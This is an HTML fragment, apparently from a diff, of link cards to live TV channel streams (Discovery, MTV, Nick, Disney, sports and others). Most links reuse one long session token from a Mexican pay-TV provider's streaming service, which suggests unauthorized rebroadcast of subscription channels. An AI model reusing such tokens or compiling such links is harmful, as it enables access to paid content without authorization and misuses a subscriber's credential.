+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=2113&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s16800_dark_360w_270h.png	"/> <h6>	A3 SERIES	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=2375&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s106724_dark_360w_270h.png	"/> <h6>	STAR TVE	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=74&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s25553_dark_360w_270h.png	"/> <h6>	EL GOURMET	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=86&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s15798_dark_360w_270h.png	"/> <h6>	DISCOVERY CHANNEL	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=98&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s48527_dark_360w_270h.png	"/> <h6>	DISCOVERY SCIENCE	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=2376&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s65342_dark_360w_270h.png	"/> <h6>	DISCOVERY ID	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=95&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s65940_dark_360w_270h.png	"/> <h6>	DISCOVERY THEATER	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=2379&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s46608_dark_360w_270h.png	"/> <h6>	DISCOVERY TURBO	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=101&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s66488_dark_360w_270h.png	"/> <h6>	DISCOVERY WORLD	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=91&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s25068_dark_360w_270h.png	"/> <h6>	NAT GEO	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=89&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s40137_dark_360w_270h.png	"/> <h6>	HISTORY	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=2378&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s18649_dark_360w_270h.png	"/> <h6>	ANIMAL PLANET	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=2380&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s73822_dark_360w_270h.png	"/> <h6>	TLC	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=75&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	https://i.ibb.co/YLzBnMs/Garage-TV.png	"/> <h6>	GARAGE TV	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=212&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s12712_dark_360w_270h.png	"/> <h6>	MTV	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=213&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s24214_dark_360w_270h.png	"/> <h6>	MTV HITS	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=211&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s66419_dark_360w_270h.png	"/> <h6>	MTV LIVE	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=334&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s56245_dark_360w_270h.png	"/> <h6>	MTV 00's	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=214&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s65060_dark_360w_270h.png	"/> <h6>	MTV 80's	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=218&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s34394_dark_360w_270h.png	"/> <h6>	TELEHIT MÚSICA	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=220&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s73070_dark_360w_270h.png	"/> <h6>	TELEHIT +	</h6></a></li>
+<li> <a href="	https://srv1.zcast.com.br/kpoptv/kpoptv/playlist.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s66345_dark_360w_270h.png	"/> <h6>	KPop (US)	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=221&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s18101_dark_360w_270h.png	"/> <h6>	BANDAMAX	</h6></a></li>
+<li> <a href="	https://mdstrm.com/live-stream-playlist/57b4dc126338448314449d0c.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s32749_dark_360w_270h.png	"/> <h6>	TELERITMO	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=112&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s59562_dark_360w_270h.png	"/> <h6>	CARTOON NETWORK	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=108&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s63109_dark_360w_270h.png	"/> <h6>	TOONCAST	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=115&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s26089_dark_360w_270h.png	"/> <h6>	CARTOONITO	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=331&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s16707_dark_360w_270h.png	"/> <h6>	NICK	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=2147&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s77783_dark_360w_270h.png	"/> <h6>	TEENNICK	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=1708&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s90209_dark_360w_270h.png	"/> <h6>	NICKMUSIC	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=117&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s60295_dark_360w_270h.png	"/> <h6>	NICK JR	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=113&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s19234_dark_360w_270h.png	"/> <h6>	DISNEY CHANNEL	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=118&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s60506_dark_360w_270h.png	"/> <h6>	DISNEY JR	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=109&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s16680_dark_360w_270h.png	"/> <h6>	DISCOVERY KIDS	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=1984&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s56036_dark_360w_270h.png	"/> <h6>	BABY FIRST	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=116&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s56036_dark_360w_270h.png	"/> <h6>	BABY TV	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=174&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s65129_dark_360w_270h.png	"/> <h6>	TUDN	</h6></a></li>
+<li> <a href="	https://claro-jw.cdn.vustreams.com/live/channel05/live.isml/master.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s72291_dark_360w_270h.png	"/> <h6>	Claro Sports	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=2564&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s72291_dark_360w_270h.png	"/> <h6>	Claro Sports	</h6></a></li>
